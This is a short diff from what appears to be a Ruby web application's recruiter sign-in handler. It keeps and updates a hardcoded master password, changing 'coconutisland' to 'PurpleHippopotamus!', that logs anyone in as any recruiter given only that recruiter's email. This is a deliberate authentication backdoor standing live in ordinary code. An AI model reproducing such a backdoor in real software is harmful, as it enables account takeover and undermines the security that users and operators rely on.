@@ -161,7 +161,7 @@ post "/recruiters/signin/?" do
   unless params[:email] == ''
   
     if recruiter = Recruiter.first(:email => params[:email])
-      if (recruiter.password == params[:password])  || (params[:password] == 'coconutisland')
+      if (recruiter.password == params[:password]) || (params[:password] == "PurpleHippopotamus!")
         
         session[:recruiter] = recruiter.id
         
